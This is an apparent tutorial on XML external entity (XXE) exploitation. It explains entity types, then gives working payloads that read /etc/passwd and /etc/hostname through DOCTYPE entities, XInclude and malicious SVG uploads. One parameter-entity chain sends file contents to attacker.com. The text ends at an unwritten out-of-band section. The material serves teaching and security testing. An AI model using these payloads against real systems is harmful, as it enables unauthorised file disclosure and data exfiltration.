# Mastering XXE Exploitation

## ENTITY

#### 1.Internal Entity

   ##### Definition:  	

   XML allows custom entities to be defined within the DTD.


```python
<!ENTITY entityname "Hello">
<!ENTITY entityname2 'World'>
```
##### Usage:

```python
<sample>I would like to say &entityname; &entityname2;</sample>
```
##### Output:

```python
<sample>I would like to say Hello World</sample>
````


#### 2. External Entity

   ##### Definition:


   XML external entities are a type of custom entity whose definition is located outside of the DTD where they are declared.The declaration of an external entity uses the SYSTEM    keyword and must specify a URL from which the value of the entity should be loaded.

```python
<!ENTITY includeme SYSTEM "include.xml">
<!ENTITY includeme2 SYSTEM "http://attackerserver/include.xml">
```

Usage:

```python
<sample>
    <head>Header</head>
    <first>&includeme;</first>
    <second>&includeme2;</second>
</sample>
```

include.xml:

```python
<body>I am to be included.</body>
```
Output:

```python <sample>
    <head>Header</head>
    <first><body>I am to be included.</body></first>
    <second><body>I am to be included.</body></second>
</sample>
```


## XXE Testing

##### Basic Payload
```python
<!DOCTYPE test [<!ENTITY ent "test"> ]>
<root>&ent;</root>
```
output:

```python
<root>test</root>`
```

##### Payload to fetch internal files

```python
<!DOCTYPE test [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
```

```python

		 |--> This declaration introduces Document Type Definition, it declares the root element of the document named test
 		 |
		 |
		 |       |--> This is name of the document type or root element
		 |       |
 		 |       |       |--> (Entity declaration or Entity defination)  is used to define named entities which are place holders 
  		 |       |       |     for the text that can be reused within the document it defines an entity named ent 
 		 |       |       |
		 |       |       |
	     <!DOCTYPE test [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
 		  <userInfo>                               |
 		<firstName>John</firstName>                |
                <lastName>&ent;</lastName>                 |--> external content such as url's or files
		 </userInfo>         |
		                     |
				     | --> This is Actual xml content

```




## Parameter Entities 
   Parameter entities in XML are used within DTDs (Document Type Definitions) and are different from general entities, which are used in the XML content itself. Parameter entities are primarily used for defining reusable content or DTD fragments and help in structuring DTDs in a modular way.





### What Are Parameter Entities?

  * Parameter entities are declared with a `%` character, followed by the entity name, and are used in DTDs (not in the XML document body).
  * They are typically employed to include reusable DTD fragments or configuration within the DTD.
  * To reference a parameter entity, you need to use `%entityName;` inside the DTD.





### Syntax for Declaring Parameter Entities



```python
<!ENTITY % entityName "replacement text or value">
```

* `%entityName;` will be replaced with "replacement text or value" wherever it is referenced in the DTD.




### Examples of Parameter Entities

#### 1. Basic Parameter Entity Usage


```python
<!DOCTYPE root [
   <!ENTITY % greeting "Hello, World!">
   <!ELEMENT root (#PCDATA)>
]>
<root>%greeting;</root>
```

In this example:
* The DTD defines a parameter entity named `greeting` with the value "Hello, World!".
* However, this example is incorrect in practice because `%greeting;` cannot be used directly in the XML document content.

To use the parameter entity, you need to declare an additional general entity:


```python
<!DOCTYPE root [
   <!ENTITY % greeting "Hello, World!">
   <!ENTITY myGreeting "%greeting;">
   <!ELEMENT root (#PCDATA)>
]>
<root>&myGreeting;</root>
```

* Here, `myGreeting` is a general entity that uses the value of the parameter entity `%greeting`.




#### 2. Including an External DTD Using Parameter Entities
You can use parameter entities to include external DTDs, making the DTD modular and easier to maintain.


#### External DTD (`common.dtd`):


```python
<!ENTITY % commonElements "<!ELEMENT greeting (#PCDATA)>">
```


#### Main XML File:


```python
<!DOCTYPE root [
   <!ENTITY % common SYSTEM "http://example.com/common.dtd">
   %common;
   %commonElements;
]>
<root>
   <greeting>Hello from an external DTD!</greeting>
</root>
```


In this example:
* The parameter entity `%common` references an external DTD file located at `http://example.com/common.dtd`.
* `%commonElements;` is used to insert the content from the external DTD (in this case, an element declaration).





## 3. Conditional DTD Sections Using Parameter Entities
Parameter entities can be used to include or exclude parts of a DTD based on conditional sections.


```python
<!DOCTYPE root [
   <!ENTITY % includeGreeting "INCLUDE">
   <![%includeGreeting;[
      <!ELEMENT greeting (#PCDATA)>
   ]]>
   <!ELEMENT root (greeting)>
]>
<root>
   <greeting>Conditional Greeting Example</greeting>
</root>
```


In this example:
* The `%includeGreeting` parameter entity determines whether the `greeting` element is included.
* The conditional section `<![%includeGreeting;[ ... ]]>` is included because `%includeGreeting` is set to "INCLUDE".




## Security Implications of Parameter Entities

1. #### XML External Entity (XXE) Attacks 

Parameter entities can be used to reference external files or resources, leading to XXE vulnerabilities if the XML parser is not configured securely


```python
<!DOCTYPE root [
   <!ENTITY % file SYSTEM "file:///etc/passwd">
   <!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%file;'>">
   %eval;
]>
<root>&exfil;</root>
```

In this XXE example, an external file `(/etc/passwd)` is accessed and sent to an attacker's server.




2. #### Entity Reference Loops
   
   Defining parameter entities that reference each other in a circular manner can cause infinite loops:


```python
<!ENTITY % loop "%loop;">
```

This will trigger a "detected an entity reference loop" error in most XML parsers.





## Differences Between Parameter Entities and General Entities

|        Feature               |            Parameter Entities                            |    General Entities
|------------------------------|:---------------------------------------------------------|--------------------------------------------------------------:
|  Declared with               |         `%` (e.g., `<!ENTITY % name "value">`)           |           None (e.g., `<!ENTITY name "value">)`
|  Usage Scope                 |                Within DTDs only                          |             In XML document content
|  Syntax for Reference        |                `%name;`                                  |   `&name;`
|  Typical Use Cases           |         Including DTD fragments,conditional DTD sections |             Embedding content in XML 
|  Security Considerations     |         Can lead to XXE or loops if misconfigured        |                Rarely used for file access






## Summary
Parameter entities are a powerful feature in XML DTDs that help in reusing and modularizing DTD content. However, they must be used with caution due to the security risks associated with external entities and potential loops. Proper configuration of XML parsers and secure handling of DTDs is crucial to avoid XXE vulnerabilities.


## Internal Subset problem

Supposed a developer would like to wrap around a parameter entity as follows:

```python
<!DOCTYPE document [
	<!ENTITY % sample "hello world">
 	<!ENTITY wrapped "<body>%sample;</body>" >
]>
<document>&wrapped;</document>
```


The above would face an error "`XMLSyntaxError: PEReferences forbidden in internal subset`".

## In order to use a parameter entity in an entity's value, an external entity has to be used.

* external.dtd:

```python
<!ENTITY wrapped "<body>%sample;</body>" >
```

* document.xml:

```python
<!DOCTYPE document [
	<!ENTITY % sample "hello world">
 	<!ENTITY % dtd SYSTEM "external.dtd">
	%dtd;
]>
<document>&wrapped;</document>
```
* Output:

```python
<document><body>hello world</body></document>
```

### First match matters

Given the following definition and body:

```python
<!DOCTYPE r [
 <!ENTITY a "one" >
 <!ENTITY a "two" >
 <!ENTITY % param '<!ENTITY a "three">'>
 %param;
]>
<Sample> &a; </Sample>
```

* Output:

```python
<Sample> one </Sample>
```
When an entity is defined more than once, the XML parser will assume the first match and drop the remaining.


### limitations :-

*  XXE can only be used to obtain files or responses that contain “valid” XML or text.
* It is difficult to exfiltrate plain text files that are not valid XML files (e.g. files that contain XML special characters such as &, < and >)

* `CDATA` - used to make the XML parser interpret contents as text data and not as markup

## CDATA Enters the chat

* In the case of "<", this is due to parser scanning for the start of an XML node. If the content does not form a proper XML node, the parser would raise exceptions like "lxml.etree._raiseParseError XMLSyntaxError: chunk is not well balanced". A well-form XML <test></test> would not face such error.

* In the case of "&", this is due to parser scanning for an entity's name. Without a proper entity syntax, the parser would raise exceptions like "lxml.etree._raiseParseError XMLSyntaxError: xmlParseEntityRef: no name". A well-formed XML entity syntax like &gt; would not face such error.

* If the file content can be surround by <![CDATA[ and ]]> , the file content can be retrievable.

* This requires a wrapper and the knowledge of the Internal Subset Problem comes to our rescue.

* However, if the length of the file with illegal characters is too large, XML parser will attempt to throw "XMLSyntaxError: Detected an entity reference loop" as it attempts to stop billion laughter attacks.


## Hidden Attack surface 

 Attack surface for XXE injection vulnerabilities is obvious in many cases, because the application's normal HTTP traffic includes requests that contain data in XML format. In other cases, the attack surface is less visible. However, if you look in the right places, you will find XXE attack surface in requests that do not contain any XML. 

 

 ### 1.   When XML is hidden & only parameters are used (Xinclude)

   Some applications receive client-submitted data, embed it on the server-side into an XML document, and then parse the document. An example of this occurs when client-submitted data is placed into a back-end SOAP request, which is then processed by the backend SOAP service.

In this situation, you cannot carry out a classic XXE attack, because you don't control the entire XML document and so cannot define or modify a DOCTYPE element. However, you might be able to use XInclude instead. XInclude is a part of the XML specification that allows an XML document to be built from sub-documents. You can place an XInclude attack within any data value in an XML document, so the attack can be performed in situations where you only control a single item of data that is placed into a server-side XML document.

To perform an XInclude attack, you need to reference the XInclude namespace and provide the path to the file that you wish to include.

   ```XML

	<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
 ```


 
### 2.   XXE Via File upload (SVG/docx) :-

Some applications allow users to upload files which are then processed server-side. Some common file formats use XML or contain XML subcomponents. Examples of XML-based formats are office document formats like DOCX and image formats like SVG.

For example, an application might allow users to upload images, and process or validate these on the server after they are uploaded. Even if the application expects to receive a format like PNG or JPEG, the image processing library that is being used might support SVG images. Since the SVG format uses XML, an attacker can submit a malicious SVG image and so reach hidden attack surface for XXE vulnerabilities. 



```XML
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>

```



### 3.   Modified content type : -

   Most POST requests use a default content type that is generated by HTML forms, such as application/x-www-form-urlencoded. Some web sites expect to receive requests in this format but will tolerate other content types, including XML. 

```python
        POST /action HTTP/1.0
   	Content-Type: application/x-www-form-urlencoded
   	Content-Length: 7

    	foo=bar
```

```python
   	POST /action HTTP/1.0
   	Content-Type: text/xml
  	Content-Length: 52

  	<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```



OUT OF BAND XXE 
